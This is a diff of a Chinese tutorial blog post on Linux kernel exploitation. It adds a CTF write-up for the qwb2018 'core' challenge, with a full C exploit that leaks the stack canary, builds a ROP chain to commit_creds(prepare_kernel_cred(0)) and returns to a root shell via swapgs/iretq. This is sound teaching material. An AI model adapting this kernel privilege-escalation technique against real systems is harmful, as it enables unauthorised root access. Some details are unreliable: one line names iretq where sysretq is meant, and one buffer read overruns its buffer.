@@ -9,8 +9,8 @@ published: true
 | [如何进入系统态](#如何进入系统态) |
 | [关于内核态的保护及常见绕过办法](#关于内核态的保护及常见绕过办法) |
 | [什么是 save_stat 和 restore_stat，以及如何提权](#什么是save_stat和restore_stat以及如何提权) |
-| [题目 xman2019 babykernel](#题目-xman2019-babykernel) |
-| [题目 强网杯2018 - Core](#题目-qwb2018-core) |
+| [题目 xman2019 babykernel (附固件下载和 Exp)](#题目-xman2019-babykernel) |
+| [题目 强网杯2018 - Core (附固件下载和 Exp)](#题目-qwb2018-core) |
 
 在 Linux 操作系统中 CPU 的特权级别分为四个等级：  
 Ring 0、Ring 1、Ring 2、Ring 3
@@ -202,7 +202,8 @@ SMAP 中的 E 为 Access，旨在防止内核态时访问用户态数据. 其开
 ### [](#header-3)什么是save_stat和restore_stat以及如何提权
 
 相信了解过 kernel pwn 的读者都知道，在打开驱动进入内核态前必须要调用 save_stat 将 cs(代码段寄存器)、ss(栈段寄存器)、rsp(栈寄存器)、rflags(标志位寄存器) 的值放入全局变量.   
-这一操作本身不是必要的，记录这些寄存器的值的目的是防止在 内核态 手动返回到 用户态时，失去用户态上下文(或者说失去用户态的寄存器值)  
+
+这一操作在正常业务中本身不是必要的，记录这些寄存器的值的目的是防止在 内核态 手动返回到 用户态时，失去用户态上下文(或者说失去用户态的寄存器值)  
 
 需要注意的是，在此过程中不能破坏原先栈结构.  
 
@@ -246,7 +247,23 @@ void restore_stat()
 }
 ```
 
-当调用 iretq 时，栈结构如下所示. iretq 按如下结构恢复各个寄存器的值并返回到用户态，结束
+当调用 swapgs 时，内核通过 swapgs 将用户态 GS 基址保存到 MSR，并加载内核的 GS 基址. 一个正常业务中的 syscall 的 gs 切换逻辑如下所示
+
+```asm
+syscall						//触发某个系统调用
+↓
+swapgs						//将用户态 GS 基址保存到 MSR，并加载内核的 GS 基址
+mov %rsp, gs:[cpu_stack]	//使用内核 GS 访问内核堆栈
+[该系统调用主逻辑]
+swapgs						//恢复用户 GS
+sysretq						//返回用户态
+```
+
+当调用 iretq 时，栈结构如下所示. iretq 按如下结构恢复各个寄存器的值并返回到用户态，结束. 
+
+为什么 syscall 不使用 iretq 而使用 sysretq？  
+因为 int 0x80、iretq 用于较为复杂的中断、异常或任务切换的返回，是一种需要从堆栈恢复上下文的切换.  
+而 syscall、iretq 是专门为快速系统调用设计的指令，比 int 0x80 和 iretq 更高效. syscall、sysretq 不涉及堆栈切换(RSP 和 SS) 
 
 ```stack
 rsp:   rip    的值
@@ -256,8 +273,7 @@ rsp:   rip    的值
        ss     的值
 ```
 
-那么 `commit_creds(prepare_kernel_cred(0))` 到底干了什么？`prepare_kernel_cred(0)` 这个函数会使我们分配一个新的cred结构(uid=0, gid=0等)，再使用 `commit_creds` 并且把它应用到调用进程后，此时我们就是root权限了. `commit_creds` 和 `prapare_kernel_cred` 都是内核函数,一般可以通过 `cat /proc/kallsyms` 查看他们的地址，但是必须需要root权限
-
+那么 `commit_creds(prepare_kernel_cred(0))` 到底干了什么？`prepare_kernel_cred(0)` 这个函数会使我们分配一个新的cred结构(uid=0, gid=0等)，再使用 `commit_creds` 并且把它应用到调用进程后，此时我们就是root权限了. `commit_creds` 和 `prapare_kernel_cred` 都是内核函数，一般可以通过 `cat /proc/kallsyms` 查看他们的地址，但是必须需要root权限
 
 ### [](#header-3)题目 xman2019 babykernel
 
@@ -467,5 +483,196 @@ exploit(r)
 [Linux Kernel Pwn 初探 - T3LS](https://xz.aliyun.com/t/7625)
 
 ### [](#header-3)题目 qwb2018 core
+
+题目下载：[qwb2018_core.zip](/image/kernelpwn/qwb2018_core.zip.zip)
+
+首先对 core.ko 逆向，打开 init_module 查看函数，发现总共有这么三个:  
+`core_write、core_ioctl、core_release`
+
+继续查看存在哪些保护，发现 Canary，这就意味着需要找个漏洞泄露 Canary  
+![qwb](/image/kernelpwn/10.png)  
+
+##### [](#header-3) 漏洞1: Canary 及其他数据读取漏洞
+
+`core_read` 函数的本意是将 v5 的值复制到用户输入中  
+
+但可以发现当 `core_read` 函数中 v5 的起点(也就是 off) 的值不正确时，会将多余的栈中内容 copy 到用户输入的地址. 
+
+而 off 的值在哪里改呢？在 `core_ioctl` 中你可以发现当第二个参数是 `0x6677889C` 时，可以直接修改 off 的值为任意值. v5 的长度为 0x40. 这就意味着当 off 为 0x40 时，即可刚好将下一个 v6(Canary) 的值写入用户输入的地址
+
+`core_read`  
+![qwb](/image/kernelpwn/8.png)  
+
+`core_ioctl`  
+![qwb](/image/kernelpwn/9.png)  
+
+一个仅仅对于该漏洞的 Exp 如下所示
+
+```c
+char ioctl_res[64];
+ioctl(fd, 0x6677889C, 0x40);
+ioctl(fd, 0x6677889B, ioctl_res);
+```
+
+##### [](#header-3) 漏洞2: write 栈写入漏洞
+
+在 `core_copy_func` 中你可以发现 `&name` 中的内容被复制到 v2 栈中，并且复制的长度是用户输入值，而且 `&name` 是可控的，在 `core_write` 中你可以任意修改他的值. 因此只要能进入 `core_copy_func` 的分支 else 中即可触发栈写入. 那么如何进入 else 中呢？
+
+在 `core_copy_func` 中你可以发现存在整型溢出绕过漏洞. 本来 a1 类型为 `__int64` ，当 a1 < 63 时就会进入 else 中. 但是 `qmemcpy` 又将 a1 强制转成了 `unsigned __int16`. 这意味着只需要先造成整型上溢，然后再通过强转的数据切断，即可触发漏洞. 一个可能的 payload 如下所示
+
+```
+0xffffffffffff0100 
+前面的 48 位主要造成溢出，整个 0xffffffffffff0100 在 __int64 下的值为一个负数
+后面的 16 位主要是后续 qmemcpy 处理. 当强转切断后，a1 的值为 0x0100
+```
+
+`core_write`
+![qwb](/image/kernelpwn/12.png)  
+
+`core_copy_func`  
+![qwb](/image/kernelpwn/11.png)  
+
+##### [](#header-3) DEBUG
+
+如果要 debug `core_ioctl` 函数，只需要搜索 该函数的前几个字节，然后对该地址打断点即可. 如下所示
+
+```
+search -t qword 0x48536677889bfe81
+```
+
+![qwb](/image/kernelpwn/13.png)  
+
+payload:  
+```c
+#define _GNU_SOURCE
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <string.h>
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/socket.h>
+
+#define KERNCALL __attribute__((regparm(3)))
+
+void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) NULL;
+void (*commit_creds)(void*) KERNCALL = (void*) NULL;
+
+unsigned long long original_base = 0xffffffff81000000;
+unsigned long long user_cs, user_ss, user_rflags, user_sp;
+unsigned long long base_addr, canary;
+
+//----------------- 自定义函数 Start -----------------
+//----------------- 自定义函数 End   -----------------
+
+void* get_address(char* address) {
+	char str[256];
+	char ch;
+	char hex_num[256] = {0};
+	
+	sprintf(str, "cat /tmp/kallsyms | grep '%s' | awk '{print $1}' > .exp_cache", address);
+	int ret = system(str);
+	
+	FILE *fp1 = fopen("./.exp_cache", "r");
+	int i = 0;
+	while((ch=fgetc(fp1)) != EOF) {
+		if(ch == '\n' || ch == 0){ break; }
+		hex_num[i ++] = ch;
+	}
+	fclose(fp1);
+	return (void *) strtoull(hex_num, NULL, 16);
+}
+
+void save_stat() {
+	asm(
+		"movq %%cs, %0;"
+		"movq %%ss, %1;"
+		"movq %%rsp, %2;"
+		"pushfq;"
+		"popq %3;"
+	: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
+}
+
+void creds_restore_stat() {
+	commit_creds(prepare_kernel_cred(0));
+	asm(
+		"pushq   %0;"
+		"pushq   %1;"
+		"pushq   %2;"
+		"pushq   %3;"
+		"pushq   $shell;"
+		"pushq   $0;"
+		"swapgs;"
+		"popq    %%rbp;"
+		"iretq;"
+	::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
+}
+
+void shell() {
+        printf("Successfully root\n");
+        char buffer[100];
+        int in = open("/flag", O_RDONLY,S_IRUSR); 
+        int flag = read(in, buffer, 1024);
+        write(1, buffer, flag);
+        exit(0);
+}
+
+int main() {
+	prepare_kernel_cred = get_address("prepare_kernel_cred");
+	commit_creds = get_address("commit_creds");
+	
+	unsigned long long text_base 		= (unsigned long long)commit_creds - 0x9c8e0;
+	unsigned long long pop_rdi 		= 0xffffffff81000b2f - original_base + text_base;
+	unsigned long long mov_rdi_rax_pop_rbx	= 0xffffffff8178e68a - original_base + text_base;
+	unsigned long long swapgs_popfq		= 0xffffffff81a012da - original_base + text_base;
+	unsigned long long iretq		= 0xffffffff81050ac2 - original_base + text_base;
+	save_stat();
+
+	int fd = open("/proc/core", 2);
+	if (fd < 0) {
+		printf("[-] bad open device\n");
+		exit(-1);
+	}
+	
+	char ioctl_res[64];
+	ioctl(fd, 0x6677889C, 0x40);
+	ioctl(fd, 0x6677889B, ioctl_res);
+	unsigned long long canary_val 	= ((unsigned long long *)ioctl_res)[0];
+	unsigned long long rbp_val	= ((unsigned long long *)ioctl_res)[1];
+	unsigned long long rop_chain[256];
+	
+	// core_copy_func 的第二个初始化变量 unsigned long long a[10]
+	// a[8] = canary;
+	int i = 8;
+	rop_chain[i ++] = canary_val;
+	rop_chain[i ++] = rbp_val;
+	rop_chain[i ++] = pop_rdi;
+	rop_chain[i ++] = 0;
+	rop_chain[i ++] = (unsigned long long) prepare_kernel_cred;
+	rop_chain[i ++] = mov_rdi_rax_pop_rbx;
+	rop_chain[i ++] = 0;
+	rop_chain[i ++] = (unsigned long long) commit_creds;
+
+	rop_chain[i ++] = swapgs_popfq;
+	rop_chain[i ++] = 0;
+	rop_chain[i ++] = iretq;
+	rop_chain[i ++] = (unsigned long long)shell;
+	rop_chain[i ++] = user_cs;
+	rop_chain[i ++] = user_rflags;
+	rop_chain[i ++] = user_sp;
+	rop_chain[i ++] = user_ss;
+	
+	write(fd, rop_chain, sizeof(rop_chain));
+	ioctl(fd, 0x6677889A, 0xffffffffffff0000|0x100);
+}
+```
 
 (未完)
